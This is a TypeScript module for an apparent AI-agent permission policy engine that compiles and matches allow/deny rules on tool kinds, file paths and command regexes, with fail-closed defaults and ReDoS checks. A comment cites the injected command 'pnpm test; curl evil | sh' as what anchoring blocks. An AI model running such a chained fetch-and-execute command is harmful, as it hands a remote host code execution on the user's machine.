import { OmniError } from "@omni-acp/protocol";
import type { PolicyRule, PolicySubject } from "@omni-acp/protocol";
import { compileGlob, isAbsolutePattern, normalizeSeparators } from "./glob.js";

/**
 * One rule against one subject. PURE, and the whole of §20.3's table.
 *
 * The clauses that are easy to get subtly wrong, and what they must do:
 *
 *  - an UNKNOWN `kind` matches NOTHING but the literal `["*"]` — D4 rule 6, lifted from the
 *    responder to the matcher, so an agent that invents a tool kind cannot land on a grant;
 *  - a `path` clause matches only when `subject.paths` is NON-EMPTY **and every entry matches**.
 *    F38 proves `locations[]` under-reports, so "no paths" is not "no files touched", and an
 *    unlisted second path must never be able to launder the first;
 *  - a path-LESS call against a `path` rule is NO MATCH, never a match by vacuity;
 *  - a `cmd` clause on a `tool_call` subject is rejected at COMPILE, because F38 leaves it
 *    nothing to match on;
 *  - regexes are ANCHORED for the author, length-capped, and refused at load if they backtrack
 *    catastrophically.
 *
 * There is deliberately NO matcher on `PolicySubject.title` (F27): one recorded grant arrived
 * under three different English names, one of them embedding a path, and `no-agent-prose` forbids
 * branching on any of them. `subject.title` is carried for the audit record and is read by
 * nothing here — `guards.test.ts` asserts that, rather than this sentence promising it.
 *
 * Owned by M2-B-WP-P.
 */

/** The schema's caps, re-checked so a hand-built rule cannot walk past zod. */
const MAX_CMD = 512;
const MAX_PATH = 512;

/**
 * The subject tags this matcher recognizes.
 *
 * `tool_call` and `command` are v2's own two arms. `elicitation` is OURS: D10 folds
 * `elicitation/create` into the same lifecycle and `PolicyMatch.method` can name it, so an
 * elicitation has to be addressable by a rule or that enum member is dead. A tag in NEITHER set
 * matches no rule at all and falls to `default` — v2's "unknown subjects should be preserved or
 * declined by policy", read as fail-closed (§5.8.8).
 */
export const SUBJECT_TAGS: ReadonlySet<string> = new Set(["tool_call", "command", "elicitation"]);

export interface CompiledRule {
  readonly rule: PolicyRule;
  /** null means no `kind` clause. `wildcard` is the literal `["*"]` and nothing else. */
  readonly kind: { readonly wildcard: boolean; readonly set: ReadonlySet<string> } | null;
  /** null means no `path` clause. Patterns stay UNANCHORED: no cwd is known until a subject. */
  readonly paths: readonly string[] | null;
  readonly cmd: RegExp | null;
  /**
   * `match.subject` / `match.method`, with the SCHEMA's own `"any"` default applied.
   *
   * `PolicyMatch` always sets them, but `matchRule` is exported and a hand-built rule may not
   * have met zod. Reading `undefined` as "no clause" reproduces the schema; reading it as a
   * clause that equals nothing would make such a rule silently dead, which is the one failure a
   * security rule may not have.
   */
  readonly subjectClause: "tool_call" | "command" | "any";
  readonly methodClause: "session/request_permission" | "elicitation/create" | "any";
  /** §20.3's action-directional case folding, decided once from the rule's own action. */
  readonly caseInsensitive: boolean;
}

// -- the regex safety net (M2-R18) -------------------------------------------

/** A numbered or named backreference. It is what turns a linear matcher super-linear. */
function hasBackreference(src: string): boolean {
  for (let i = 0; i < src.length; i++) {
    if (src[i] !== "\\") continue;
    const next = src[i + 1];
    if (next === undefined) break;
    if (/[1-9]/.test(next) || next === "k") return true;
    i += 1; // an escaped char is never itself an escape
  }
  return false;
}

/** True at every index that sits inside a `[...]` character class. */
function classSpans(src: string): boolean[] {
  const inside: boolean[] = new Array<boolean>(src.length).fill(false);
  let open = false;
  for (let i = 0; i < src.length; i++) {
    const ch = src[i];
    if (ch === "\\") {
      inside[i] = open;
      if (i + 1 < src.length) inside[i + 1] = open;
      i += 1;
      continue;
    }
    if (!open && ch === "[") {
      open = true;
      inside[i] = true;
      continue;
    }
    if (open && ch === "]") {
      inside[i] = true;
      open = false;
      continue;
    }
    inside[i] = open;
  }
  return inside;
}

function bodyIsRisky(body: string): boolean {
  const inClass = classSpans(body);
  let depth = 0;
  for (let i = 0; i < body.length; i++) {
    if (body[i] === "\\") {
      i += 1;
      continue;
    }
    if (inClass[i] === true) continue;
    const ch = body[i];
    if (ch === "(") depth += 1;
    else if (ch === ")") depth -= 1;
    else if (ch === "*" || ch === "+") return true;
    else if (ch === "{" && /^\{\d+,\}/.test(body.slice(i))) return true;
    else if (ch === "|" && depth === 0) return true;
  }
  return false;
}

/**
 * A conservative detector for the nested-quantifier family: a quantified group whose body itself
 * quantifies without a bound, or alternates at its top level.
 *
 * Deliberately over-strict. A pattern it refuses may well have been safe, and a hung regex in the
 * permission path is a hung TURN — which is why §20.3 puts the refusal at config LOAD rather than
 * at request time. The shipped `src-edit` command rule is an alternation with NO quantifier on
 * the group, and it is the fixture that keeps this from being over-strict in practice.
 */
function isCatastrophic(src: string): boolean {
  const inClass = classSpans(src);
  const stack: number[] = [];
  for (let i = 0; i < src.length; i++) {
    if (src[i] === "\\") {
      i += 1;
      continue;
    }
    if (inClass[i] === true) continue;
    if (src[i] === "(") {
      stack.push(i);
      continue;
    }
    if (src[i] !== ")") continue;
    const start = stack.pop();
    if (start === undefined) continue;
    const after = src[i + 1];
    const quantified =
      after === "*" || after === "+" || (after === "{" && /^\{\d+,\d*\}/.test(src.slice(i + 1)));
    if (!quantified) continue;
    if (bodyIsRisky(src.slice(start + 1, i))) return true;
  }
  return false;
}

function compileCommandRegex(pattern: string, caseInsensitive: boolean): RegExp {
  if (pattern.length > MAX_CMD) {
    throw new OmniError(
      "bad_request",
      `policy cmd pattern is longer than ${String(MAX_CMD)} characters`,
    );
  }
  if (hasBackreference(pattern)) {
    throw new OmniError("bad_request", `policy cmd pattern uses a backreference: "${pattern}"`);
  }
  if (isCatastrophic(pattern)) {
    throw new OmniError(
      "bad_request",
      `policy cmd pattern can backtrack catastrophically: "${pattern}" - a hung regex in the permission path is a hung turn`,
    );
  }
  try {
    // The pattern is compiled ON ITS OWN FIRST, and that is a SECURITY check rather than a
    // courtesy: `^(?:` + pattern + `)$` is textual, so a pattern with an unbalanced `)` closes
    // the group we opened and the anchors escape into an alternation. `x)|(.*` would become
    // `^(?:x)|(.*)$` — which reads as a narrow rule and matches every command there is. A
    // standalone compile rejects exactly that, because an unmatched `)` is a SyntaxError.
    new RegExp(pattern);
  } catch (e) {
    throw new OmniError("bad_request", `policy cmd pattern is not a valid regex: "${pattern}"`, {
      cause: e,
    });
  }
  try {
    // ANCHORED for the author (§20.3). It is why `pnpm test` cannot match
    // `pnpm test; curl evil | sh`, and it is applied even when the author wrote the anchors
    // themselves - DESIGN §4's own example does, and `^` / `$` are zero-width.
    return new RegExp(`^(?:${pattern})$`, caseInsensitive ? "i" : "");
  } catch (e) {
    throw new OmniError("bad_request", `policy cmd pattern is not a valid regex: "${pattern}"`, {
      cause: e,
    });
  }
}

// -- compile -----------------------------------------------------------------

/**
 * The rule's own load-time checks, in ONE place, so `matchRule` and `createPolicyEngine` cannot
 * disagree about what a legal rule is.
 *
 * Throws `bad_request`, which the daemon turns into a `400` at CREATE - where an operator can act
 * on it. A rule that can never fire is dead policy somebody will plan around (M2-R17, M2-R18).
 */
export function compileRule(rule: PolicyRule): CompiledRule {
  const m = rule.match;
  const subjectClause = m.subject ?? "any";
  const methodClause = m.method ?? "any";

  if (m.cmd !== undefined && subjectClause === "tool_call") {
    throw new OmniError(
      "bad_request",
      `policy rule "${rule.id}": a cmd clause on a tool_call subject can never fire (M2-R18) - F38 shows the call carries nothing to match on`,
    );
  }
  if (m.path !== undefined && m.kind === undefined && subjectClause === "any") {
    throw new OmniError(
      "bad_request",
      `policy rule "${rule.id}": a path clause with no kind and no subject is a load error (M2-R17) - a path clause narrows a grant, it never authorises one`,
    );
  }

  // §20.3's last row: a grant is made HARDER to satisfy and a restriction EASIER, which is the
  // only assignment that fails closed in both directions on a case-insensitive volume.
  const caseInsensitive = rule.action !== "allow";

  const paths =
    m.path === undefined
      ? null
      : m.path.map((p) => {
          if (p.length === 0 || p.length > MAX_PATH) {
            throw new OmniError(
              "bad_request",
              `policy rule "${rule.id}": a path glob must be 1..${String(MAX_PATH)} characters`,
            );
          }
          const normalized = normalizeSeparators(p);
          if (normalized.split("/").some((seg) => seg === "." || seg === "..")) {
            throw new OmniError(
              "bad_request",
              `policy rule "${rule.id}": path glob "${p}" has a "." or ".." segment, which can never match a realpath'd absolute`,
            );
          }
          // An absolute pattern is compiled HERE so a malformed one fails at load; a relative one
          // is anchored to the subject's cwd and compiled there (see `globFor`).
          if (isAbsolutePattern(normalized)) compileGlob(normalized, { caseInsensitive });
          return normalized;
        });

  return {
    rule,
    kind:
      m.kind === undefined
        ? null
        : { wildcard: m.kind.length === 1 && m.kind[0] === "*", set: new Set(m.kind) },
    paths,
    cmd: m.cmd === undefined ? null : compileCommandRegex(m.cmd, caseInsensitive),
    subjectClause,
    methodClause,
    caseInsensitive,
  };
}

// -- match -------------------------------------------------------------------

/**
 * A relative pattern anchored to the subject's cwd, memoized.
 *
 * The memo is a pure function of (pattern, cwd, folding) and holds no decision, so `decide` stays
 * deep-equal over repeated calls - which is what the purity table asserts a thousand times over.
 *
 * BOUNDED, because the key contains a cwd and a daemon outlives every worker in it: an unbounded
 * memo in a long-running process is a slow leak wearing a performance hat. Over the cap it is
 * cleared wholesale rather than evicted one entry at a time - recompiling a glob costs
 * microseconds and an LRU here would be more machinery than the thing it protects.
 */
const GLOB_CACHE = new Map<string, (abs: string) => boolean>();
const GLOB_CACHE_MAX = 1_024;

function globFor(pattern: string, cwd: string, caseInsensitive: boolean): (abs: string) => boolean {
  const absolute = isAbsolutePattern(pattern) ? pattern : `${normalizeSeparators(cwd)}/${pattern}`;
  const key = `${caseInsensitive ? "i" : "s"} ${absolute}`;
  const hit = GLOB_CACHE.get(key);
  if (hit !== undefined) return hit;
  const made = compileGlob(absolute, { caseInsensitive });
  if (GLOB_CACHE.size >= GLOB_CACHE_MAX) GLOB_CACHE.clear();
  GLOB_CACHE.set(key, made);
  return made;
}

export function matchCompiled(c: CompiledRule, s: PolicySubject): boolean {
  const m = c.rule.match;

  // v2's tag first: an UNKNOWN tag falls to `default` whatever else a rule says, because a rule
  // written for a shape nobody has seen cannot have meant this one.
  if (!SUBJECT_TAGS.has(s.type)) return false;
  if (c.subjectClause !== "any" && c.subjectClause !== s.type) return false;
  if (c.methodClause !== "any" && c.methodClause !== s.method) return false;
  if (m.agent !== undefined && !m.agent.includes(s.agentId)) return false;

  if (c.kind !== null && !c.kind.wildcard) {
    // D4 rule 6 at the matcher: a kind this rule does not name - including one nobody has seen
    // yet, and including the ABSENT kind of a command - matches nothing but the literal `["*"]`.
    if (s.kind === null) return false;
    if (!c.kind.set.has(s.kind)) return false;
  }

  if (c.cmd !== null) {
    if (s.command === null) return false;
    if (!c.cmd.test(s.command)) return false;
  }

  if (c.paths !== null) {
    // F38: EMPTY IS NOT "NO PATHS". A path-less call must never satisfy a path clause by vacuity,
    // and EVERY listed path must match, so an unlisted second path cannot launder the first.
    if (s.paths.length === 0) return false;
    for (const p of s.paths) {
      let ok = false;
      for (const pattern of c.paths) {
        if (globFor(pattern, s.cwd, c.caseInsensitive)(p)) {
          ok = true;
          break;
        }
      }
      if (!ok) return false;
    }
  }

  return true;
}

export function matchRule(rule: PolicyRule, s: PolicySubject): boolean {
  return matchCompiled(compileRule(rule), s);
}
